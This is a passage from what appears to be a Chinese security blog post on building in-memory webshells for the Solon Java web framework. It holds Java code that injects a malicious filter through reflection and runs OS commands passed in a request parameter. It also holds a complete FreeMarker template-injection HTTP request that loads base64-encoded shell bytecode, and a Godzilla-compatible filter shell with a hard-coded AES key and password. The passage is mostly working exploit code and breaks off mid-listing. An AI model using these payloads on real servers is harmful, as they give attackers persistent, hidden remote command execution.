class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    ctx.output(output);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            chain.doFilter(ctx);<br>        &#125;;<br><br>        <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> Context.current();<br>        <span class="hljs-keyword">if</span> (ctx != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">_request</span> <span class="hljs-operator">=</span> getfieldobj(ctx,<span class="hljs-string">&quot;_request&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> getfieldobj(_request,<span class="hljs-string">&quot;request&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">serverHandler</span> <span class="hljs-operator">=</span> getfieldobj(request,<span class="hljs-string">&quot;serverHandler&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getfieldobj(serverHandler,<span class="hljs-string">&quot;handler&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">arg$1</span> <span class="hljs-operator">=</span> getfieldobj(handler,<span class="hljs-string">&quot;arg$1&quot;</span>);<br>            <span class="hljs-type">ChainManager</span> <span class="hljs-variable">_chainManager</span> <span class="hljs-operator">=</span> (ChainManager) getfieldobj(arg$<span class="hljs-number">1</span>,<span class="hljs-string">&quot;_chainManager&quot;</span>);<br>            _chainManager.addFilter(evilFilter, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getfieldobj</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> field.get(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getSuperclass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> field.get(obj);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>利用jmg生成一个freemarker包装的模板，放上我们内存马的字节码。注意：内存马需要url编码。(要是没有ScriptEngineManager的话该怎么活啊~安全行业不能没有ScriptEngineManager，就像西方不能失去耶路撒冷)。</p>
+<p><img src="https://image.sp4rks.xyz/2025/04/image-20250421163428978.png" srcset="/img/loading.gif" lazyload alt="image-20250421163428978"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">http://192.168.112.138:8080/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.112.138:8080<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6993<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-scilab">template=$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?new()(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).eval(<span class="hljs-string">&quot;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try&#123;classLoader.loadClass(&#x27;</span>org.apache.logging.qs.DateUtil&#x27;).newInstance();&#125;<span class="hljs-keyword">catch</span> (e)&#123;var clsString = classLoader.loadClass(<span class="hljs-string">&#x27;com.example.demo.FilterMemoryShellController&#x27;</span>);var bytecodeBase64 = <span class="hljs-string">&#x27;yv66vgAAADQA2QoALgBpCgAtAGoHAGsKAAMAbBIAAABxCgByAHMIADwKAC0AdAgAPggAPwgAQAgAQQgAQgcAdQoADgB2CgAuAHcKAHgAeQoAegB7CgB6AHwKAHgAfQgAfgoAcgB/CACACgCBAIIKABwAgwgAhAoAHACFBwCGCACHCACICACJCACKCgCLAIwKAIsAjQoAjgCPBwCQCgAkAJEIAJIKACQAkwoAJACUCgAkAJUIAJYKAHIAlwsAmACZBwCaBwCbAQAGPGluaXQ%2bAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAuTGNvbS9leGFtcGxlL2RlbW8vRmlsdGVyTWVtb3J5U2hlbGxDb250cm9sbGVyOwEADVN0YWNrTWFwVGFibGUHAJoHAGsBAAxpbmplY3RGaWx0ZXIBAAhfcmVxdWVzdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB3JlcXVlc3QBAA1zZXJ2ZXJIYW5kbGVyAQAHaGFuZGxlcgEABWFyZyQxAQANX2NoYWluTWFuYWdlcgEAI0xvcmcvbm9lYXIvc29sb24vY29yZS9DaGFpbk1hbmFnZXI7AQAKZXZpbEZpbHRlcgEAJExvcmcvbm9lYXIvc29sb24vY29yZS9oYW5kbGUvRmlsdGVyOwEAA2N0eAEAJUxvcmcvbm9lYXIvc29sb24vY29yZS9oYW5kbGUvQ29udGV4dDsHAJwHAJ0BAApFeGNlcHRpb25zAQALZ2V0ZmllbGRvYmoBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA29iagEACWZpZWxkTmFtZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAEE1ldGhvZFBhcmFtZXRlcnMBABVsYW1iZGEkaW5qZWN0RmlsdGVyJDABAFEoTG9yZy9ub2Vhci9zb2xvbi9jb3JlL2hhbmRsZS9Db250ZXh0O0xvcmcvbm9lYXIvc29sb24vY29yZS9oYW5kbGUvRmlsdGVyQ2hhaW47KVYBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQAFY2hhaW4BAClMb3JnL25vZWFyL3NvbG9uL2NvcmUvaGFuZGxlL0ZpbHRlckNoYWluOwcAhgcAWQcAngcAkAcAnwcAoAEAClNvdXJjZUZpbGUBACBGaWx0ZXJNZW1vcnlTaGVsbENvbnRyb2xsZXIuamF2YQwALwAwDAA7ADABABNqYXZhL2xhbmcvRXhjZXB0aW9uDAChADABABBCb290c3RyYXBNZXRob2RzDwYAohAAVA8GAKMMAKQApQcAnQwApgCnDABLAEwBACFvcmcvbm9lYXIvc29sb24vY29yZS9DaGFpbk1hbmFnZXIMAKgAqQwAqgCrBwCsDACtAK4HAK8MALAAsQwAsgCzDAC0AKsBAANjbWQMALUAtgEAB29zLm5hbWUHALcMALgAtgwAuQC6AQADd2luDAC7ALwBABBqYXZhL2xhbmcvU3RyaW5nAQACc2gBAAItYwEAB2NtZC5leGUBAAIvYwcAvQwAvgC/DADAAMEHAMIMAMMAxAEAEWphdmEvdXRpbC9TY2FubmVyDAAvAMUBAAJcQQwAxgDHDADIAMkMAMoAugEAAAwAXgDLBwCfDACkAMwBACxjb20vZXhhbXBsZS9kZW1vL0ZpbHRlck1lbW9yeVNoZWxsQ29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBACJvcmcvbm9lYXIvc29sb24vY29yZS9oYW5kbGUvRmlsdGVyAQAjb3JnL25vZWFyL3NvbG9uL2NvcmUvaGFuZGxlL0NvbnRleHQBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAnb3JnL25vZWFyL3NvbG9uL2NvcmUvaGFuZGxlL0ZpbHRlckNoYWluAQATamF2YS9sYW5nL1Rocm93YWJsZQEAD3ByaW50U3RhY2tUcmFjZQoAzQDOCgAtAM8BAAhkb0ZpbHRlcgEAJigpTG9yZy9ub2Vhci9zb2xvbi9jb3JlL2hhbmRsZS9GaWx0ZXI7AQAHY3VycmVudAEAJygpTG9yZy9ub2Vhci9zb2xvbi9jb3JlL2hhbmRsZS9Db250ZXh0OwEACWFkZEZpbHRlcgEAKChMb3JnL25vZWFyL3NvbG9uL2NvcmUvaGFuZGxlL0ZpbHRlcjtJKVYBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQANZ2V0U3VwZXJjbGFzcwEABXBhcmFtAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAoKExvcmcvbm9lYXIvc29sb24vY29yZS9oYW5kbGUvQ29udGV4dDspVgcA0AwA0QDVDABTAFQBACJqYXZhL2xhbmcvaW52b2tlL0xhbWJkYU1ldGFmYWN0b3J5AQALbWV0YWZhY3RvcnkHANcBAAZMb29rdXABAAxJbm5lckNsYXNzZXMBAMwoTGphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXA7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlOylMamF2YS9sYW5nL2ludm9rZS9DYWxsU2l0ZTsHANgBACVqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwAQAeamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzACEALQAuAAAAAAAEAAEALwAwAAEAMQAAAHcAAQACAAAAESq3AAEqtgACpwAITCu2AASxAAEABAAIAAsAAwADADIAAAAaAAYAAAAPAAQAEQAIABQACwASAAwAEwAQABUAMwAAABYAAgAMAAQANAA1AAEAAAARADYANwAAADgAAAAQAAL/AAsAAQcAOQABBwA6BAABADsAMAACADEAAAEFAAMACQAAAFK6AAUAAEy4AAZNLMYARiosEge2AAhOKi0SCbYACDoEKhkEEgq2AAg6BSoZBRILtgAIOgYqGQYSDLYACDoHKhkHEg22AAjAAA46CBkIKwO2AA%2bxAAAAAwAyAAAALgALAAAAGAAGAC0ACgAuAA4ALwAWADAAHwAxACkAMgAzADMAPQA0AEoANQBRADcAMwAAAFwACQAWADsAPAA9AAMAHwAyAD4APQAEACkAKAA/AD0ABQAzAB4AQAA9AAYAPQAUAEEAPQAHAEoABwBCAEMACAAAAFIANgA3AAAABgBMAEQARQABAAoASABGAEcAAgA4AAAACwAB/QBRBwBIBwBJAEoAAAAEAAEAAwABAEsATAADADEAAAC3AAIABQAAAC8rtgAQLLYAEU4tBLYAEi0rtgATsE4rtgAQtgAULLYAEToEGQQEtgASGQQrtgATsAABAAAAEwAUAAMAAwAyAAAAHgAHAAAAOwAJADwADgA9ABQAPgAVAD8AIgBAACgAQQAzAAAAPgAGAAkACwBNAE4AAwAiAA0ATQBOAAQAFQAaADQANQADAAAALwA2ADcAAAAAAC8ATwA9AAEAAAAvAFAAUQACADgAAAAGAAFUBwA6AEoAAAAEAAEAAwBSAAAACQIATwAAAFAAABAKAFMAVAADADEAAAGRAAUACAAAAKEqEhW2ABbGAIsEPRIXuAAYTi3GABEttgAZEhq2ABuZAAUDPRyZAB0GvQAcWQMSHVNZBBIeU1kFKhIVtgAWU6cAGga9ABxZAxIfU1kEEiBTWQUqEhW2ABZTOgS4ACEZBLYAIrYAIzoFuwAkWRkFtwAlEia2ACc6BhkGtgAomQALGQa2ACmnAAUSKjoHKhkHtgArpwAITSy2AAQrKrkALAIAsQABAAAAkQCUAAMAAwAyAAAAPgAPAAAAGgAJABsACwAcABEAHQAhAB4AIwAhAFoAIgBnACMAdwAkAIsAJQCRACkAlAAnAJUAKACZACoAoAArADMAAABcAAkACwCGAFUAVgACABEAgABXAFEAAwBaADcAWABZAAQAZwAqAFoAWwAFAHcAGgBcAF0ABgCLAAYAXgBRAAcAlQAEADQANQACAAAAoQBGAEcAAAAAAKEAXwBgAAEAOAAAADAACP0AIwEHAGEdVgcAYv4ALgcAYgcAYwcAZEEHAGH/AAcAAgcASQcAZQAAQgcAOgQASgAAAAQAAQBmAFIAAAAJAgBGEAAAXxAAAAMAZwAAAAIAaADUAAAACgABANIA1gDTABkAbQAAAAwAAQBuAAMAbwBwAG8%3d&#x27;</span>;var bytecode;<span class="hljs-keyword">try</span>&#123;var clsBase64 = classLoader.loadClass(<span class="hljs-string">&#x27;java.util.Base64&#x27;</span>);var clsDecoder = classLoader.loadClass(<span class="hljs-string">&#x27;java.util.Base64$Decoder&#x27;</span>);var decoder = clsBase64.getMethod(<span class="hljs-string">&#x27;getDecoder&#x27;</span>).invoke(base64Clz);bytecode = clsDecoder.getMethod(<span class="hljs-string">&#x27;decode&#x27;</span>, clsString).invoke(decoder, bytecodeBase64);&#125; <span class="hljs-keyword">catch</span> (ee) &#123;<span class="hljs-keyword">try</span> &#123;var datatypeConverterClz = classLoader.loadClass(<span class="hljs-string">&#x27;javax.xml.bind.DatatypeConverter&#x27;</span>);bytecode = datatypeConverterClz.getMethod(<span class="hljs-string">&#x27;parseBase64Binary&#x27;</span>, clsString).invoke(datatypeConverterClz, bytecodeBase64);&#125; <span class="hljs-keyword">catch</span> (eee) &#123;var clazz1 = classLoader.loadClass(<span class="hljs-string">&#x27;sun.misc.BASE64Decoder&#x27;</span>);bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);&#125;&#125;var clsClassLoader = classLoader.loadClass(<span class="hljs-string">&#x27;java.lang.ClassLoader&#x27;</span>);var clsByteArray = (new java.lang.String(<span class="hljs-string">&#x27;a&#x27;</span>).getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(<span class="hljs-string">&#x27;defineClass&#x27;</span>, [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(<span class="hljs-number">0</span>),new java.lang.Integer(bytecode.<span class="hljs-built_in">length</span>));clazz.newInstance();&#125;<span class="hljs-string">&quot;)&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://image.sp4rks.xyz/2025/04/image-20250421163039755.png" srcset="/img/loading.gif" lazyload alt="image-20250421163039755"></p>
+<h1 id="哥斯拉Solon-Filter内存马构造"><a href="#哥斯拉Solon-Filter内存马构造" class="headerlink" title="哥斯拉Solon Filter内存马构造"></a>哥斯拉Solon Filter内存马构造</h1><p>哥斯拉并不依赖request，把上面的马改一下就行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> org.noear.solon.core.ChainManager;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.Context;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.Filter;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GodzillaSolonFilter</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">xc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;3c6e0b8a9c15224a&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;pass&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">md5</span> <span class="hljs-operator">=</span> md5(pass + xc);<br>    <span class="hljs-keyword">private</span> Class&lt;?&gt; payload;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">GodzillaSolonFilter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            injectFilter();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">injectFilter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Filter</span> <span class="hljs-variable">evilFilter</span> <span class="hljs-operator">=</span> (ctx, chain) -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">paramContent</span> <span class="hljs-operator">=</span> ctx.param(pass);<br>                <span class="hljs-keyword">if</span> (paramContent != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">byte</span>[] data = base64Decode(paramContent);<br>                    data = x(data, <span class="hljs-literal">false</span>);<br><br>                    <span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">null</span>) &#123;<br>                        payload = defClass(data);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">arrOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> payload.newInstance();<br>                        f.equals(arrOut);<br>                        f.equals(data);<br>                        f.equals(ctx.request());<br><br>                        ctx.output(md5.substring(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>));<br>                        f.toString();<br>                        ctx.output(base64Encode(x(arrOut.toByteArray(), <span class="hljs-literal">true</span>)));<br>                        ctx.output(md5.substring(<span class="hljs-number">16</span>));<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            chain.doFilter(ctx);<br>        &#125;;<br><br>        <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> Context.current();<br>        <span class="hljs-keyword">if</span> (ctx != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">_request</span> <span class="hljs-operator">=</span> getfieldobj(ctx,<span class="hljs-string">&quot;_request&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> getfieldobj(_request,<span class="hljs-string">&quot;request&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">serverHandler</span> <span class="hljs-operator">=</span> getfieldobj(request,<span class="hljs-string">&quot;serverHandler&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getfieldobj(serverHandler,<span class="hljs-string">&quot;handler&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">arg$1</span> <span class="hljs-operator">=</span> getfieldobj(handler,<span class="hljs-string">&quot;arg$1&quot;</span>);<br>            <span class="hljs-type">ChainManager</span> <span class="hljs-variable">_chainManager</span> <span class="hljs-operator">=</span> (ChainManager) getfieldobj(arg$<span class="hljs-number">1</span>,<span class="hljs-string">&quot;_chainManager&quot;</span>);<br>            _chainManager.addFilter(evilFilter, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 加载类字节码</span><br>    <span class="hljs-keyword">private</span> Class&lt;?&gt; defClass(<span class="hljs-type">byte</span>[] classBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[<span class="hljs-number">0</span>], Thread.currentThread().getContextClassLoader());<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (Class&lt;?&gt;) defMethod.invoke(urlClassLoader, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br>    &#125;<br><br>    <span class="hljs-comment">// AES加解密</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] x(<span class="hljs-type">byte</span>[] s, <span class="hljs-type">boolean</span> m) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            c.init(m ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(xc.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));<br>            <span class="hljs-keyword">return</span> c.doFinal(s);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Base64编码</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Encode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; base64;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encodeToString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span 